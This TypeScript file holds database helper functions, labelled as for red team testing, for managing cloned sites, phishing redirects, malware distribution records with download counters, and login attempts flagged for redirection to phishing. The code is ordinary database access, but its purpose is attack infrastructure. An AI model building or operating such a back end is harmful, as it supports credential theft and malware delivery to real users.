import { eq, and, gte } from "drizzle-orm";
import { getDb } from "./db";
import {
  members,
  forumMessages,
  siteClones,
  phishingRedirects,
  malwareDistribution,
  authAttempts,
  downloadTracking,
  InsertMember,
  InsertForumMessage,
  InsertSiteClone,
  InsertPhishingRedirect,
  InsertMalwareDistribution,
  InsertAuthAttempt,
  InsertDownloadTracking,
} from "../drizzle/schema";

/**
 * KBH@NIGHT Operational Database Helpers
 * TEST USE ONLY - For authorized red team testing within defined scope
 */

// ============= MEMBER MANAGEMENT =============

export async function createMember(data: InsertMember) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(members).values(data);
}

export async function getMemberByUsername(username: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.select().from(members).where(eq(members.username, username)).limit(1);
  return result[0];
}

export async function getAllMembers() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(members);
}

export async function updateMemberStatus(memberId: number, status: "active" | "inactive" | "suspended") {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.update(members).set({ status }).where(eq(members.id, memberId));
}

export async function updateMemberLastActivity(memberId: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.update(members).set({ lastActivity: new Date() }).where(eq(members.id, memberId));
}

// ============= FORUM MANAGEMENT =============

export async function createForumMessage(data: InsertForumMessage) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(forumMessages).values(data);
}

export async function getForumMessages(limit: number = 50) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(forumMessages).orderBy(forumMessages.createdAt).limit(limit);
}

export async function getRecentForumMessages(hours: number = 24) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const cutoffTime = new Date(Date.now() - hours * 60 * 60 * 1000);
  return db
    .select()
    .from(forumMessages)
    .where(gte(forumMessages.createdAt, cutoffTime))
    .orderBy(forumMessages.createdAt);
}

// ============= SITE CLONING =============

export async function createSiteClone(data: InsertSiteClone) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(siteClones).values(data);
}

export async function getActiveSiteClone() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.select().from(siteClones).where(eq(siteClones.isActive, true)).limit(1);
  return result[0];
}

export async function getAllSiteClones() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(siteClones);
}

export async function updateSiteCloneActive(cloneId: number, isActive: boolean) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.update(siteClones).set({ isActive }).where(eq(siteClones.id, cloneId));
}

export async function rotateSiteClone(newCloneId: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");

  // Deactivate all clones
  await db.update(siteClones).set({ isActive: false });

  // Activate the new clone
  return db.update(siteClones).set({ isActive: true }).where(eq(siteClones.id, newCloneId));
}

// ============= PHISHING REDIRECTION =============

export async function createPhishingRedirect(data: InsertPhishingRedirect) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(phishingRedirects).values(data);
}

export async function getActivePhishingRedirect() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.select().from(phishingRedirects).where(eq(phishingRedirects.isActive, true)).limit(1);
  return result[0];
}

export async function getAllPhishingRedirects() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(phishingRedirects);
}

export async function updatePhishingRedirectActive(redirectId: number, isActive: boolean) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.update(phishingRedirects).set({ isActive }).where(eq(phishingRedirects.id, redirectId));
}

// ============= MALWARE DISTRIBUTION =============

export async function createMalwareDistribution(data: InsertMalwareDistribution) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(malwareDistribution).values(data);
}

export async function getActiveMalwareDistribution() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(malwareDistribution).where(eq(malwareDistribution.isActive, true));
}

export async function getMalwareDistributionById(id: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.select().from(malwareDistribution).where(eq(malwareDistribution.id, id)).limit(1);
  return result[0];
}

export async function updateMalwareDownloadCount(id: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  // Get current count and increment
  const current = await getMalwareDistributionById(id);
  if (!current) throw new Error("Malware not found");
  return db
    .update(malwareDistribution)
    .set({ downloadCount: (current.downloadCount || 0) + 1 })
    .where(eq(malwareDistribution.id, id));
}

export async function getWeekendAccessMalware() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(malwareDistribution).where(eq(malwareDistribution.weekendAccessOnly, true));
}

// ============= AUTHENTICATION TRACKING =============

export async function trackAuthAttempt(data: InsertAuthAttempt) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(authAttempts).values(data);
}

export async function getAuthAttemptsByIp(ipAddress: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(authAttempts).where(eq(authAttempts.ipAddress, ipAddress));
}

export async function getRecentFailedAttempts(ipAddress: string, minutes: number = 15) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const cutoffTime = new Date(Date.now() - minutes * 60 * 1000);
  return db
    .select()
    .from(authAttempts)
    .where(
      and(
        eq(authAttempts.ipAddress, ipAddress),
        eq(authAttempts.success, false),
        gte(authAttempts.lastAttempt, cutoffTime)
      )
    );
}

export async function markAuthAttemptAsRedirected(attemptId: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db
    .update(authAttempts)
    .set({ redirectedToPhishing: true })
    .where(eq(authAttempts.id, attemptId));
}

// ============= DOWNLOAD TRACKING =============

export async function trackDownload(data: InsertDownloadTracking) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.insert(downloadTracking).values(data);
}

export async function getDownloadsByMember(memberId: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(downloadTracking).where(eq(downloadTracking.memberId, memberId));
}

export async function getDownloadsByMalware(malwareId: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(downloadTracking).where(eq(downloadTracking.malwareId, malwareId));
}

export async function getDownloadStatistics() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(downloadTracking);
}
